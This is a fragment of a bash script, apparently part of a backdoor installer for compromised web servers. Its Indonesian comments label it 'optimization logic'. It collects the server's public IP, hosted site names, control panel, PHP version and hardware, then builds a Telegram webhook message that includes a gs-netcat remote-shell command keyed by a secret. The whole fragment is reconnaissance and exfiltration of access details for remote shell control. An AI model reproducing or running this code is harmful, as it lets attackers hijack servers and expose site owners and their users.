...
# --- LOGIKA OPTIMASI (Sangat Aman) ---
IP_PUB=$(curl -s --max-time 2 https://ifconfig.me || echo "IP-Hidden")
CURRENT_DIR=$(pwd)
ALL_SITES=$(ls -1 /var/www /home 2>/dev/null | grep "\." | tr '\n' ',' | sed 's/,$//')
[[ -z $ALL_SITES ]] && ALL_SITES=$(hostname -f 2>/dev/null || echo "Unknown-Host")

# Deteksi Panel & Hardware dengan pengaman
PANEL="Plain"
[ -d /usr/local/cpanel ] && PANEL="cPanel"
[ -d /usr/local/cyberpanel ] && PANEL="CyberPanel"
[ -d /usr/local/psa ] && PANEL="Plesk"
[ -f /www/server/panel/install.pl ] && PANEL="aaPanel"

PHP_V=$(php -v 2>/dev/null | head -n 1 | cut -d " " -f 2 || echo "N/A")
CORE=$(nproc 2>/dev/null || echo "?")
RAM=$(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "?")

# Webhook Message - Pastikan variabel GS_SECRET dan hostname di-escape dengan \
msg="ðŸŒ [${ALL_SITES}] | ðŸ“‚ ${CURRENT_DIR} | âš™ï¸ ${PANEL} | ðŸ˜ PHP:${PHP_V} | ðŸ’» ${CORE}vCPU/${RAM} | ðŸ–¥ï¸ ${IP_PUB} | \$(hostname) | \$(uname -rom) | gs-netcat -i -s \${GS_SECRET}"
### Telegram
